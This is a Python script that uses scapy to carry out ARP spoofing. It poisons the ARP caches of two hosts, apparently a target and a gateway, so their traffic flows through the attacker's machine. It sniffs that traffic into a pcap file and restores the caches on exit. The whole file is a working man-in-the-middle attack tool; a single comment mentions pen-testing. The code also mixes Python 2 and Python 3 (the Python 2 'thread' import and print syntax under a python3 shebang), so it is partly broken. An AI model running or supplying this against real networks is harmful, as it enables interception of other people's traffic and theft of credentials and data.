#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time
import sys
import argparse
import os
import signal
import thread

def parse_command_line():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--targets", dest="targets", help="The target/gateways to spoof", action="append")
    values = parser.parse_args()
    return values.targets

def get_mac(ip):
    # the next two lines creates a packet that asks for a specific ip
    arp_req_packet = scapy.ARP()
    arp_req_packet.pdst=ip
    # creating the broadcast MAC address packet
    broadcast_packet = scapy.Ether()
    broadcast_packet.dst = "ff:ff:ff:ff:ff:ff"
    # combining packets
    bc_arpreq_packet = broadcast_packet/arp_req_packet
    # sending and receiving packets, the answered ones and the unanswered. The timeout is necessary.  
    ans_list = scapy.srp(bc_arpreq_packet, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip) # pen-tester mac address automatically inserted here
    scapy.send(packet, verbose=False)
    
def restore(dest_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False) # count=4 to make sure we cleaned things up
    
    #os.kill(os.getpid(), signal.SIGINT)

def spoof_target(target1, target2):
    sent_packets_num = 0
    try:
        while True:
            spoof(target1, target2)
            spoof(target2, target1)
            sent_packets_num+=2
            #python3: print("\rPackets sent: " + str(sent_packets_num), end="")
            #python2: 
            print("\rPackets sent: " + str(sent_packets_num)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("Cleaning up arp tables and resetting changes...")
        restore(target2, target1)
        restore(target1, target2)

def main():
    targets = parse_command_line()
    
    thread.start_new_thread(spoof_target, (targets[0], targets[1]))
    
    try:
        bpf_filter = "ip host %s" % targets[1]      # assuming that targets[1] is the target ip (not the gateway ip)
        packets = scapy.sniff(filter=bpf_filter)
        scapy.wrpcap('arp_spoofer.pcap', packets)
        while True: time.sleep(100)
    except KeyboardInterrupt:
        print("Cleaning up arp tables and resetting changes...")
        restore(targets[1], targets[0])
        restore(targets[0], targets[1])
        sys.exit(0)
    
    
main()